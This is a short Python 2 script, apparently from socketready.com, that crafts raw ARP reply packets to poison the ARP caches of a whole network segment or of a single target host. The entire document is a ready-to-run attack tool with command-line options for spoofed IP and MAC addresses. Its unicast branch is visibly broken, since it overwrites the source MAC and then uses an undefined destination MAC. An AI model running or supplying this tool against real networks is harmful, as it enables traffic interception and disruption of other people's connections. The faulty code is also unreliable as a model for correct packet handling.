#!/usr/bin/env python
#
#	Arp poisoning with broadcast arp replys
#	unicast support is also included
#
#	socketready.com
#

from socket import *
from optparse import OptionParser

#poison method
#creates raw arp reply packet 
#and puts it on the wire
def poison(interface, src_mac, src_ip, dst_mac, dst_ip):
	s = socket(AF_PACKET, SOCK_RAW)
	s.bind((interface, 0))

	#this is used for the ethernet frame
	ethernet_type = "\x08\x06"
	ethernet_dst_mac = dst_mac
	ethernet_src_mac = src_mac

	#create payload arp packet
	arp_head = "\x00\x01\x08\x00\x06\x04\x00\x02"
	arp_src_mac = src_mac
	arp_src_ip = src_ip
	arp_dst_mac = dst_mac
	arp_dst_ip = dst_ip

	#data to send
	ethernet = ethernet_dst_mac + ethernet_src_mac + ethernet_type
	arp_payload = arp_head + arp_src_mac + arp_src_ip + arp_dst_mac + arp_dst_ip

	#packet must be 60 bytes
	tail = (60 - len(ethernet + arp_payload)) * "\x00"
	s.send(ethernet + arp_payload + tail)

def main():
	usage = "usage: %prog [options] "
	parser = OptionParser(usage)
	parser.add_option("-i", "--interface", dest="interface", help="interface to use for arping")
	parser.add_option("-b", "--broadcast", action="store_true", dest="broadcast", help="set this to arp the entire segment.  Warning, could start some shit.")
	parser.add_option("-d", "--target_mac", dest="target_mac", help="target mac ie. aa:bb:cc:dd:ee:ff")
	parser.add_option("-a", "--target_ip", dest="target_ip", help="target ip ie. 192.168.1.1")
	parser.add_option("-c", "--source_mac", dest="source_mac", help="source mac ie. aa:bb:cc:dd:ee:ff")
	parser.add_option("-s", "--spoofed_ip", dest="spoofed_ip", help="IP to spoof ie. 192.168.1.1")

	(options, args) = parser.parse_args()

	if(options.interface == ""):
		parser.print_help()

	#sending a broadcast arp poison
	elif(options.broadcast and options.spoofed_ip and options.source_mac):
		print "Arp poisoning segment"
		ip = options.spoofed_ip.split(".")
		src_ip = ''.join("%0.2X" % int(i) for i in ip).decode('hex')
		src_mac = options.source_mac.replace(":", "").decode('hex')
		poison(options.interface, src_mac, src_ip, "\xff\xff\xff\xff\xff\xff", "\xff\xff\xff\xff")
	
	#sending a unicast arp poison
	elif(not options.broadcast and options.spoofed_ip and options.source_mac and options.target_mac and options.target_ip):
		print "Arp poisoning client"
		sip = options.spoofed_ip.split(".")
		src_ip = ''.join("%0.2X" % int(i) for i in sip).decode('hex')

		src_mac = options.source_mac.replace(":", "").decode('hex')

		dip = options.target_ip.split(".")
		dst_ip = ''.join("%0.2X" % int(i) for i in dip).decode('hex')

		src_mac = options.target_mac.replace(":", "").decode('hex')		

		poison(options.interface, src_mac, src_ip, dst_mac, dst_ip)

	#print menue
	else:
		parser.print_help()


if __name__ == "__main__":
    main()
